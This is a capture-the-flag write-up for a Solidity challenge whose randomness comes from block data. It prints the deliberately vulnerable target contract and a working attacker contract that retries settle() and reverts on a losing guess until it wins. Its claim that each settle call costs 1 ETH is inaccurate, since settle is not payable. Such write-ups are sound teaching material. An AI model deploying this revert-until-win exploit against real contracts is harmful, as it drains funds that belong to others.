# 07. Predict the future

This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.

Note that it is indeed possible to solve this challenge without losing any ether.

## Target contract

```solidity
pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

## Vulnerability

The vulnerability lies here : `require(block.number > settlementBlockNumber);` with the fact that you can guess as many times as you want. So you lock you guess once (out of 10 possibilities : `uint8(keccak256(block.blockhash(block.number - 1), now)) % 10`) but then you get a theoretically infinite number of guesses.

Since we don't want to lose any ETH we will attack this challenge with a contract of our own. The idea here is that we must send 1 ETH for each call to `settle` and we get it back only if we are right... It's very likely that we will get it wrong at least once. After all, when we make a guess we have 1/10 chances to be right for the next block, 1/10 to be right for the second etc... 

The idea is to lock our guess, then call `settle` and if we are wrong : revert the transaction. That way it's as if nothing ever happened, we did not lose any ETH by seeking a settlement.

We can do so with the following smart contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma abicoder v1;

interface IChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
    function isComplete() external view returns (bool);
}

contract Attacker {

    IChallenge targetContract;

    constructor(IChallenge _targetContract) payable {
        require(msg.value == 1 ether, "send 1 ETH");
        targetContract = _targetContract;

        // You can change the guess to any value in {0, ... , 9}
        targetContract.lockInGuess{value: msg.value}(0);
    }

    function attack() public {
        targetContract.settle();
        require(targetContract.isComplete() == true, "Reverting to try again on next block...");
        msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {}
}
```

Which we deploy and call several times `attack` until we pass without loosing any money, except for the fees of course. I did it with Remix.